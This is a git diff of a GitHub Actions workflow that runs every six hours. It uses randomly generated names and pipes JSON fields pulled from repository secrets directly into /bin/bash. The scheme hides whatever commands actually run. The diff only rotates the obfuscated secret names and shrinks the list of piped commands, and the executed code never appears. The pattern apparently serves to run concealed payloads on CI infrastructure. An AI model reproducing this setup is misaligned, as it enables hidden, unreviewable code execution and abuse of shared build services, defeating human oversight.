@@ -1,36 +1,21 @@
 name: yangxiong19871010
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 2/6 * * *'
+    - cron: '5 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yangxiong19871010
         env:
-          pifcb76250: ${{ secrets.pifcb76250 }}
+          gnsm2: ${{ secrets.gnsm2 }}
         run: |
-          echo $pifcb76250 | jq -r .t82 | /bin/bash
-          echo $l600 | jq -r .wbjx7 | /bin/bash
-          echo $vj085 | jq -r .hmjvs4 | /bin/bash
-          echo $rqyn95 | jq -r .jiv489 | /bin/bash
-          echo $cfum58920 | jq -r .e517 | /bin/bash
-          echo $j20926 | jq -r .wnwk26743 | /bin/bash
-          echo $c4628 | jq -r .m2 | /bin/bash
-          echo $p30324 | jq -r .l3871 | /bin/bash
-          echo $biriz7753 | jq -r .fyxk1897 | /bin/bash
-          echo $jk22810 | jq -r .i7 | /bin/bash
-          echo $zw8 | jq -r .r6 | /bin/bash
-          echo $birju6564 | jq -r .ablp2102 | /bin/bash
-          echo $uggej30 | jq -r .ctx846 | /bin/bash
-          echo $mhuu9 | jq -r .rodp82 | /bin/bash
-          echo $fv5372 | jq -r .ntjfj2105 | /bin/bash
-          echo $jj97325 | jq -r .bcrzf930 | /bin/bash
-          echo $dwy2 | jq -r .rxl6571 | /bin/bash
-          echo $hz9 | jq -r .pwm7 | /bin/bash
-          echo $v8 | jq -r .lby86225 | /bin/bash
-          echo $is62948 | jq -r .q400 | /bin/bash
+          echo $gnsm2 | jq -r .d8598 | /bin/bash
+          echo $vy68317 | jq -r .rjjs76577 | /bin/bash
+          echo $sccw91 | jq -r .mf663 | /bin/bash
+          echo $xje8480 | jq -r .uh8736 | /bin/bash
+          echo $lusp15 | jq -r .d216 | /bin/bash
 
